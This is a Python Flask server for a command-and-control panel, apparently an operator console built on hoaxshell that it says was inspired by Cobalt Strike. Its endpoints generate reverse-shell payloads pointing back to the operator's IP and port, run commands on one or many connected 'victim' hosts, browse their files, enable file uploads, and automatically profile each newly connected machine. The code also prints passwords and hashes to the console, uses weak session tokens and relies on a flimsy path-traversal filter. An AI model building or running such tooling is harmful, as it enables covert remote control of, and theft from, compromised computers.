from flask import Flask, request, redirect, abort, send_from_directory, send_file, make_response, url_for
from flask_socketio import SocketIO
from core.server import shellServer, uploadServer
import core.upload as uSrv

# hoaxshell
import core.hoaxshell.payloads as hxPL
import core.hoaxshell.server as hxSrv

import socket, random, sys, threading
import json, base64, os, bcrypt, time # bcrypt for blowfish login

import core.controller as stages

app = Flask(__name__)
socketio = SocketIO(app)
port = int(sys.argv[1]) if len(sys.argv) >= 2 else random.randint(7000, 15535)

shell = shellServer(port=port, websock=socketio) # basic port server
threading.Thread(target=hxSrv.startServer, args=("0.0.0.0", port+1,), daemon=True).start() # hoaxshell server
upload = uploadServer(port=port-4) # upload server

ouiColors = {}
allowed = []

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '0.0.0.0'
    finally:
        s.close()
    return IP

def isAllowed(request):
    if request.cookies.get("Authentication", "0") in allowed:
        return True
    else:
        if request.remote_addr == "127.0.0.1":
            return True # its localhost, if its not you they already have access to ur machine so its whatever
        return False

def getOuis():
    """
    i am so fed up of js and their includes n shit so im just gonna mkae this
    """

    def genRandColor():
        return "rgb({},{},{})".format(random.randint(0, 128),random.randint(0, 128),random.randint(0, 128))

    data = {
        "labels": [],
        "datasets": [{
            "data": [],
            "backgroundColor": [],
            "borderWidth": 1,
            "borderColor": 'transparent'
        }]
    }
    ouis = {}

    if len(shell.info) == 0:
        return data

    for client in shell.info:
        oui = shell.info[client]["oui"]
        
        if oui not in ouis:
            ouis[oui] = 1
            if oui not in ouiColors:
                ouiColors[oui] = genRandColor()
        else:
            ouis[oui] += 1

    for i in ouis:
        data["labels"].append(i)
        data["datasets"][0]["data"].append(ouis[i])
        data["datasets"][0]["backgroundColor"].append(ouiColors[i])
        
    return data

@app.route("/")
def index():
    if not isAllowed(request): return redirect(url_for('login'), code=302)

    return open("./core/http/index.html", "r").read()

@app.route("/login")
def login():
    return open("./core/http/login.html", "r").read()

@app.route("/api/login", methods=["POST"])
def loginAPI():
    a = request.get_json(force=True)

    loginData = json.loads(open("config.json", "r").read())["login"]
    if a.get("user", False) == loginData["username"]:

        pw = a.get("pass", "False").encode('ascii')
        hash = loginData["hash"].encode('ascii')

        print(pw)
        print(hash)

        if bcrypt.checkpw(pw, hash):
            print('success')
            # v # not cryptographically safe but its whatever
            token = ''.join([random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for _ in range(256)])

            resp = make_response("success")
            resp.set_cookie('Authentication', token)

            allowed.append(token)

            return resp

        # v # is it the username? the password? you will never know
        else:
            return "failed"
    else:
        return "failed"

@app.route("/shell")
def shellhtml():
    if not isAllowed(request): return redirect(url_for('login'), code=302)
    return open("./core/http/shell.html", "r").read()

@app.route("/api/data/clients")
def clientData():
    if not isAllowed(request): return {"failure": "login"}

    a = shell.info.copy()
    a.update({"ouis": getOuis()})
    return a

@app.route("/api/data/host")
def hostData():
    if not isAllowed(request): return {"failure": "login"}
    return {
        "listener": get_ip(),
        "port": str(port)
    }

@app.route("/api/shell/run", methods=["POST"])
def runcmd():
    if not isAllowed(request): return {"failure": "login"}
    a = request.get_json(force=True)

    if a["command"].split(" ")[0] in ["curl"]:
        a["command"] += ";echo 0"

    if type(a["uid"]) != list:
        if len(a["uid"]) != 24:
            dta = shell.runCommand(a["uid"], a["command"])
        else:
            dta = hxSrv.interactive.run(a['command'], a["uid"], timeout=float(a.get("timeout", 30)))
        print(dta)
    else:
        for x in a["uid"]:
            print('exec on {}'.format(x))
            shell.runCommand(x, a["command"], _async=True)
        return "executed command \"{}\" on {} hosts".format(a["command"], len(a["uid"]))

    return dta

@app.route("/api/shell/ls", methods=["POST"])
def ls():
    if not isAllowed(request): return {"failure": "login"}
    a = request.get_json(force=True)

    directory = {}
    windows = False
    pwd = a.get("pwd", None)
    files = False
    command = ""

    if pwd == None:
        pwd = shell.runCommand(a["uid"], "pwd")
    
    if shell.info[a["uid"]]["os"] == "Windows":
        command += "dir"
    else:
        command += "ls -la"

    if pwd != None or pwd != "current":
        command += " "+pwd

    if len(a["uid"]) != 24:
        dta = shell.runCommand(a["uid"], command)
    else: # hoaxshell will always be windows
        dta = hxSrv.interactive.run(command, a["uid"], timeout=2.5)

    if "Directory: " in dta:
        windows = True
    
    for x in dta.split("\n"):
        print(x)
        if windows:
            if "Directory: " in x:
                pwd = x.split("Directory:", 1)[-1].strip()
            else:
                if x.split(" ")[0] == "----": files = True; continue

                if files:
                    b = [z for z in x]
                    b.pop(0)
                    if "." in ''.join(b):
                        directory[x.strip().split(" ")[-1]] = "file"
                    else:
                        directory[x.strip().split(" ")[-1]] = "folder"
                
        else: # unix
            if x[0] == "d":
                if (x.strip().split(" ")[-1])[-1] == ".":
                    continue
                directory[x.strip().split(" ")[-1]] = "folder"
            elif x[0] == "-":
                directory[x.strip().split(" ")[-1]] = "file"

    print(directory)

    return {"pwd": pwd, "directory": directory}

@app.route("/api/shell/delete", methods=["POST"])
def delete():
    if not isAllowed(request): return {"failure": "login"}
    a = request.get_json(force=True)

    if type(a["uid"]) != list:
        shell.killUID(a["uid"])
        try:
            hxSrv.shellData.hxUIDS.remove(a["uid"])
            hxSrv.shellData.allowedUIDS.remove(a['uid'])
        except:
            pass
    else:
        for x in a["uid"]:
            # mortifying thing to say
            print('killed child {}'.format(x))
            shell.killUID(x)
            try:
                hxSrv.shellData.hxUIDS.remove(a["uid"])
                hxSrv.shellData.allowedUIDS.remove(a['uid'])
            except:
                pass

        return "killed {} hosts".format(len(a["uid"]))

    return "ok"

# payload generation
@app.route("/api/generate/hoaxshell", methods=["POST"])
def hoaxshellPLGen():
    if not isAllowed(request): return {"failure": "login"}
    a = request.get_json(force=True)

    try:
        pl = hxPL.genPayload(a["payload"], json.loads(open("config.json", "r").read())["ip"], port+1)
        hxSrv.shellData.allowedUIDS.append(pl["payloadId"])
        return pl
    except KeyError:
        return "invalid payload type"
    
    return "None"

@app.route("/api/generate/payload", methods=["POST"])
def normalPLGen():
    if not isAllowed(request): return {"failure": "login"}
    a = request.get_json(force=True)

    payloads = json.loads(open("./core/payloads.json", "r").read())

    # check if payload is in json file
    if a["payload"] not in list(payloads):
        return "invalid payload"
    else:
        b = payloads[a["payload"]]
        b["command"] = (base64.b64decode(b["command"].encode('ascii')).decode('ascii')).replace("{ip}", json.loads(open("config.json", "r").read())["ip"]).replace("{port}", str(port)).replace("{shell}", a.get("shell", "bash")) # LOTTA SPLICING AND COULD'VE PROBABLY BEEN DONE WITH REGEX BUT WHO CARES
        return b
    
@app.route("/api/generate/list", methods=["GET"])
def getPayloads():
    if not isAllowed(request): return {"failure": "login"}
    payloads = []

    payloads += list(json.loads(open("./core/payloads.json", "r").read())) # normal payloads
    payloads += ["hoax-cURL", "hoax-iex", "hoax-iex-constrained", "hoax-iex-outfile", "hoax-iex-const-out"] # hoaxshell payloads

    return {"payloads": payloads}

@app.route("/api/generate/message", methods=["GET"])
def randMessage():
    if not isAllowed(request): return {"failure": "login"}
    """
    just a tiny little function to add a changing motd
    """
    msgs = [
        "otter was here",
        "who is the eye doctor's eye doctor?",
        "man i'm really hungry",
        "cowsay moo",
        "meowsay meow",
        "meowsynth is the best thing to be created",
        "cat flag.txt",
        "we are not the 1%",
        "inspired by cobalt strike"
    ]

    return random.choice(msgs)

@app.route('/favicon.ico')
def favicon():
    return send_from_directory('./core/http/icons', 'icon.ico',mimetype='image/vnd.microsoft.icon')

@app.route('/core/<path:req_path>')
def coreDir(req_path):
    if not isAllowed(request): return redirect(url_for('login'), code=302)
    BASE_DIR = './core/http/'

    # Joining the base and the requested path
    abs_path = os.path.join(BASE_DIR, req_path.replace("/..", ""))

    # Return 404 if path doesn't exist
    if not os.path.exists(abs_path):
        return abort(404)

    # Check if path is a file and serve
    if os.path.isfile(abs_path):
        return send_file(abs_path)
    else:
        return abort(404)
    
@app.route('/uploads/<path:req_path>')
def uploadDir(req_path):
    if not isAllowed(request): return redirect(url_for('login'), code=302)
    BASE_DIR = './uploads/'

    # Joining the base and the requested path
    abs_path = os.path.join(BASE_DIR, req_path.replace("/..", "")) # to prevent path traversals

    # Return 404 if path doesn't exist
    if not os.path.exists(abs_path):
        return abort(404)

    # Check if path is a file and serve
    if os.path.isfile(abs_path):
        return send_file(abs_path)
    else:
        return abort(404)

def hoaxShellHarvester(): # the only point of this function is to automatically start asking questions of the most recently connected hoaxshell victim
    old = 0

    while True:
        while len(hxSrv.shellData.hxUIDS) == old:
            time.sleep(0.1)
    
        shell.info.update({hxSrv.shellData.hxUIDS[-1]: shell.harvestInfo(hxSrv.shellData.hxUIDS[-1], hxSrv.interactive.run)})
        socketio.send({"connection": shell.info[hxSrv.shellData.hxUIDS[-1]]})

        old = len(hxSrv.shellData.hxUIDS)

        uSrv.allowedAuth.append(hxSrv.shellData.hxUIDS[-1]) # allow for uploading files

threading.Thread(target=hoaxShellHarvester, daemon=True).start()
threading.Thread(target=stages.sio.connect, args=('http://localhost:80',), daemon=True).start()
#app.run(host="0.0.0.0", port=80)
socketio.run(app, host="0.0.0.0", port=80, debug=False)